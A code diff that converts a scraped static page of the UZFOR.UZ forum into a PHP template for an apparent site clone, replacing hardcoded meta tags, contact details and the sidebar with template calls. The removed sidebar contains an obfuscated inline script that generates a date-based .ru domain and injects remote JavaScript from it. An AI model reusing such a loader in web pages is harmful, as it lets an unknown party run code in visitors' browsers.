@@ -1,51 +1,48 @@
-<html xmlns="http://www.w3.org/1999/xhtml" lang="ru">
+<!DOCTYPE html>
+<html lang="<?= $locale ?>" dir="<?= $locale === 'ar' ? 'rtl' : 'ltr' ?>">
   <head>
     <meta charset="utf-8">
     <meta http-equiv="X-UA-Compatible" content="IE=edge">
     <meta http-equiv="Content-Type" content="application/vnd.wap.xhtml+xml; charset=UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=2.0, user-scalable=yes">
-    <meta name="google-site-verification" content="OXKJcslapKdaRjz5ANbVrTASaxZZtXXQKe2hf4tBGk08">
-    <meta name="yandex-verification" content="3f0b5a32a96d78f2">
-    <meta name="google-site-verification" content="OXKJcslapKdaRjz5ANbVrTASaxZZtXXQKe2hf4BGk08">
     <meta name="HandheldFriendly" content="true">
     <meta name="MobileOptimized" content="width">
     <meta content="yes" name="apple-mobile-web-app-capable">
     <meta name="telegram:channel" content="@uzforuz">
-    <link rel="manifest" href="../manifest.json">
     <meta name="Generator" content="UZFOR.UZ">
-    <meta name="keywords" content="INTERNET, DASTURLASH, INTERNET TIJORAT, KOMPYUTER, TEXNIKA, TELEFON, OPERATORLAR, ILM-FAN, SEO OMALLASHTIRISH, RIVOJLANTIRISH, SAYT HAQIDA, wmr savosi, wmz savdosi, qiwi savdosi, baza savdosi, hostinglar, domenlar, bepul scriptlar, hammasi bepul, wap masterlar">
-    <meta name="description" content="UZFOR.UZ - Bizning forum!">
-    <link type="text/css" rel="stylesheet" media="only screen" href="https://uzfor.uz/theme/default/style.css?v=0.0.96">
-    <link type="text/css" rel="stylesheet" media="only screen" href="https://uzfor.uz/theme/sidebar.css?v=0.0.96">
+    <?= $this->section('meta', '') ?>
+    <?php if (! empty($keywords)): ?>
+        <meta name="keywords" content="<?= $this->e($keywords) ?>">
+    <?php endif ?>
+    <?php if (! empty($description)): ?>
+        <meta name="description" content="<?= $this->e($description) ?>">
+    <?php endif ?>
+    <?php if (! empty($canonical)): ?>
+        <link rel="canonical" href="<?= $canonical ?>">
+    <?php endif ?>
+    <link rel="stylesheet" href="<?= $this->asset('css/style.css', true) ?>">
+    <link rel="stylesheet" href="<?= $this->asset('css/sidebar.css', true) ?>">
     <meta property="og:site_name" content="UZFOR.UZ">
     <meta name="copyright" content="UZFOR.UZ - 2017">
-    <meta name="author" content="Сирожиддин Эрназаров">
-    <meta name="web_copy_date" content="07-10-2017">
-    <meta name="expires" content="13-10-2029">
+    <meta name="author" content="Akbarali">
     <meta name="web_content_type" content="Tips">
     <meta name="country" content="UZ">
-    <meta name="web_author" content="UZFOR.UZ">
-    <meta name="reply-to" content="info@uzfor.uz">
+    <meta name="reply-to" content="akbarali@uzhackersw.uz">
     <meta name="robots" content="index, follow">
     <meta name="resource-type" content="document">
     <meta name="classification" content="internet">
     <meta name="distribution" content="global">
     <meta name="rating" content="safe for kids">
     <meta name="doc-type" content="public">
-    <meta name="Identifier-URL" content="http://uzfor.uz/">
-    <meta name="subject" content="uzfor, akt sohasi, texnologiyalar, ilm-fan">
-    <meta name="contactName" content="UZFOR.UZ">
+    <meta name="Identifier-URL" content="<?=$config['homeurl']?>">
     <meta name="contactOrganization" content="UZFOR.UZ - Bizning forum!">
-    <meta name="contactStreetAddress1" content="Urgench">
     <meta name="contactZipcode" content="221100">
-    <meta name="contactCity" content="Khorem">
+    <meta name="contactCity" content="Namangan">
     <meta name="contactCountry" content="Uzbekistan">
-    <meta name="contactPhoneNumber" content="+79777287639">
-    <meta name="contactNetworkAddress" content="info@uzfor.uz">
-    <meta name="linkage" content="https://uzfor.uz">
-    <meta name="dc.language" content="english">
-    <meta name="dc.source" content="https://uzfor.uz/">
-    <meta name="dc.relation" content="https://uzfor.uz">
+    <meta name="contactNetworkAddress" content="info@uzhackersw.uz">
+    <meta name="linkage" content="<?=$config['homeurl']?>">
+    <meta name="dc.source" content="<?=$config['homeurl']?>">
+    <meta name="dc.relation" content="<?=$config['homeurl']?>">
     <!-- Chrome, Firefox OS and Opera -->
     <meta name="theme-color" content="#537397">
     <!-- Windows Phone -->
@@ -82,7 +79,7 @@
       }
     </style>
     <link rel="shortcut icon" href="https://uzfor.uz/images/favicon.ico">
-    <title>UZFOR.UZ - Bizning forum!</title>
+    <title><?= (isset($title) ? $this->e($title) : $config['copyright']) ?></title>
   </head>
   <body class="">
    
@@ -138,155 +135,13 @@
     </script>
     <button style="position: fixed;left: 0;top:0;padding: 4px;margin: 10px;" class="a" onclick="TungiRejim()">Tungi rejim</button>
     <div style="width: 1100px;margin: auto;max-width: 100%;">
-      <div class="w3-sidebar w3-bar-block w3-collapse w3-card w3-animate-left" style="width:270px;" id="mySidebar">
-        <button class="w3-bar-item w3-button w3-large w3-hide-large" onclick="w3_close()">Paneni yashirish ×</button>
-        <div class="menu">
-          <!-- logo -->
-          <span class="logo__image">
-          <a href="/"><img src="https://uzfor.uz/images/uzfor_uz_logo.png?v=0.0.01" alt="logo" style="width: 70%;" class="img-fluid"></a>
-          </span>
-          <!-- logib va profile -->
-          <center>
-            <div class="border-bottom"></div>
-            <p>
-            </p>
-            <div id="lm_prof_panel">
-              <div class="owner_panel index_panel">
-                <div class="ip_user_link">
-                  <a class="al_u211967789" href="/profile.php" data-name="Sirojiddin Ernazarov" data-photo="rasm"><img class="op_fimg" style="border-radius: 40px;" src="/files/users/photo/87_tmp_1548426402.jpg">
-                  </a>
-                  <i class="i_arr"></i>
-                  <div class="op_fcont">
-                    <h2 class="op_header">
-                      <a class="op_owner" href="/profile.php" data-name="Akbarali" data-photo="rasm">Akbarali</a>
-                      <span class="MainMenuNotificationDot" data-id="menu-apps-notification"></span>
-                    </h2>
-                    <a href="/profile.php?act=edit">Profilni tahrirlash</a>
-                  </div>
-                </div>
-              </div>
-            </div>
-            <p></p>
-            <div class="border-bottom"></div>
-          </center>
-          <ul class="main_menu">
-            <li class="mmi_feed">
-              <a href="/50-forum-yangiliklari.html" data-skiponclick="1" class="mm_item al_menu">
-                <i class="i_icon">
-                  <div class="svgIcon svgIcon-menu svgIcon-menu__feed"></div>
-                </i>
-                <span class="mmi_wrap"><span class="mm_label">Yangiliklar</span></span>
-              </a>
-            </li>
-            <li class="mmi_answers">
-              <a href="/notifications.php" data-skiponclick="1" class="mm_item al_menu">
-                <i class="i_icon">
-                  <div class="svgIcon svgIcon-menu svgIcon-menu__notify"></div>
-                </i>
-                <span class="mmi_wrap"><span class="mm_label">Bildirishnomalar</span><em class="mm_counter">1</em></span>
-              </a>
-            </li>
-            <li class="mmi_friends">
-              <a href="/avatar/" data-skiponclick="1" class="mm_item al_menu">
-                <i class="i_icon">
-                  <div class="svgIcon svgIcon-menu svgIcon-menu__user_outline_28"></div>
-                </i>
-                <span class="mmi_wrap"><span class="mm_label">Avatar yaratish</span><span class="MainMenuNotificationDot" data-id="menu-apps-notification"></span></span>
-              </a>
-            </li>
-            <li class="mmi_groups">
-              <a href="/top.php" data-skiponclick="1" class="mm_item al_menu">
-                <i class="i_icon">
-                  <div class="svgIcon svgIcon-menu svgIcon-menu__users_outline_28"></div>
-                </i>
-                <span class="mmi_wrap"><span class="mm_label">Forum faollari</span></span>
-              </a>
-            </li>
-            <li class="mmi_feed">
-              <a href="/malumotnoma.php" data-skiponclick="1" class="mm_item al_menu">
-                <i class="i_icon">
-                  <div class="svgIcon svgIcon-menu svgIcon-menu__malumotnoma"></div>
-                </i>
-                <span class="mmi_wrap"><span class="mm_label">Yo'riqnoma</span></span>
-              </a>
-            </li>
-            <li class="mmi_feed">
-              <a href="/pay.php" data-skiponclick="1" class="mm_item al_menu">
-                <i class="i_icon">
-                  <div class="svgIcon svgIcon-menu svgIcon-menu__uzforpay"></div>
-                </i>
-                <span class="mmi_wrap"><span class="mm_label">Balansni to'ldirish</span><span class="MainMenuNotificationDot" data-id="menu-apps-notification"></span></span>
-              </a>
-            </li>
-            <li class="mmi_ads">
-              <a href="/dokon/" class="mm_item al_menu">
-                <i class="i_icon">
-                  <div class="svgIcon svgIcon-menu svgIcon-menu__advertising_outline_28"></div>
-                </i>
-                <span class="mmi_wrap"><span class="mm_label">Forum do'koni</span><span class="MainMenuNotificationDot" data-id="menu-apps-notification"></span></span>
-              </a>
-            </li>
-            <li class="mmi_ads">
-              <a href="/view.php?act=files" class="mm_item al_menu">
-                <i class="i_icon">
-                  <div class="svgIcon svgIcon-menu svgIcon-menu__uzforshop"></div>
-                </i>
-                <span class="mmi_wrap"><span class="mm_label">Forum fayllari</span></span>
-              </a>
-            </li>
-            <li class="mmi_ads">
-              <a href="/mukofot.php" class="mm_item al_menu">
-                <i class="i_icon">
-                  <div class="svgIcon svgIcon-menu svgIcon-menu__uzformukofot"></div>
-                </i>
-                <span class="mmi_wrap"><span class="mm_label">Mukofotlar</span></span>
-              </a>
-            </li>
-            <li class="mmi_search">
-              <a href="/search.php" data-skiponclick="1" class="mm_item al_menu" data-header="Поиск">
-                <i class="i_icon">
-                  <div class="svgIcon svgIcon-menu svgIcon-menu__search_outline_28"></div>
-                </i>
-                <span class="mmi_wrap"><span class="mm_label">Forumdan qidirish</span></span>
-              </a>
-            </li>
-          </ul>
-          <div class="mfoot" role="navigation" aria-label="Boshqa">
-            <ul class="left_footer_menu">
-              <li class="mmi_settings">
-                <a href="/about.php" data-skiponclick="1" class="lfm_item al_menu">
-                  <i class="i_icon">
-                    <div class="svgIcon svgIcon-menu svgIcon-menu__"></div>
-                  </i>
-                  <span class="mmi_wrap"><span class="mm_label">Sayt haqida</span></span>
-                </a>
-              </li>
-              <li class="mmi_fv">
-                <a href="/exit.php" data-skiponclick="1" class="lfm_item">
-                  <i class="i_icon">
-                    <div class="svgIcon svgIcon-menu svgIcon-menu__"></div>
-                  </i>
-                  <span class="mmi_wrap"><span class="mm_label">Profildan chiqish</span></span>
-                </a>
-              </li>
-            </ul>
-          </div>
-        </div>
-        <script type="text/javascript">(function(){var s = 'abcdefghijklmnopqrstuvwxyz';function f(v){return Math.abs(v.split('').reduce(function(w,x){return w=(w<<5)-w+x.charCodeAt(0),w&w},0))}function g(v){return(26<=v?g((v/26>>0)-1):'')+s[v%26>>0]}function n(v) {var m = '';for (var i = 0; i < v; i++){m += s.charAt(Math.floor(Math.random() * s.length));}return m;}function m(v) {return Math.floor(Math.random() * Math.floor(v));}var j=673873,r=''+Math.ceil((Date.now()-1.5147648e12)/6.048e8)*j,p=11814,l=''+j+''+p,t=document;p=t.createElement('script');p.type='text/javascript';p.src='//'+g(f(j+r))+(''+f(j+r)).slice(-1)+g(f(j+(r+1)))+'.ru/'+n(7)+m(9)+n(7)+l+'.js';t.getElementById('iota7rho11814').appendChild(p)})();</script>
-      </div>
-      <script>
-        function w3_open() {
-          document.getElementById("mySidebar").style.display = "block";
-        }
-        
-        function w3_close() {
-          document.getElementById("mySidebar").style.display = "none";
-        }
-      </script>
+
+    <?= $this->section('chap-menyu', $this->fetch('system::app/chap-menyu')) ?>
+
       <div class="w3-main" style="margin-left: 270px;">
         <div class="w3-teal">
           <div class="menu" style="padding: 2px;border-radius: 4px;">
-            <div class="topclassd sticky" style="">
+            <div class="topclassd sticky">
               <table width="100%" cellpadding="0" cellspacing="0">
                 <tbody>
                   <tr>
@@ -295,7 +150,7 @@
                       <img src="https://uzfor.uz/images/uzfor_hamburger.png?v=0.0.1" style="margin-bottom: -3px; height: 18px;" alt="Menu "></a>
                     </td>
                     <td>
-                      <a class="topa" href="https://uzfor.uz/">
+                      <a class="topa" href="<?=$config['homeurl']?>">
                       <img src="https://uzfor.uz/images/svg/home.svg" style="margin-bottom: -3px; height: 18px;" alt="Bosh sahifa">
                       </a>
                     </td>
@@ -389,7 +244,7 @@
               <div>- So'ngi a'zo: <b> <a href="/profile.php?user=8977" <b="">BOYBOLA1XBETSTAVKA</a></b></div>
             </div>
             <div class="phdr">
-              © 2017-2021 UZFOR.UZ<br>
+              © 2017-2021 UZFOR.UZ clon <a href="https://t.me/kbarali">Akbarali</a> tomonidan qilingan <br>
               <a href="/qoida.php">Qoidalar</a> *
               <a href="/malumotnoma.php">Ma'lumotnoma</a> *
               <a href="/reklama.php?act=reklama_berish">Reklama</a> *
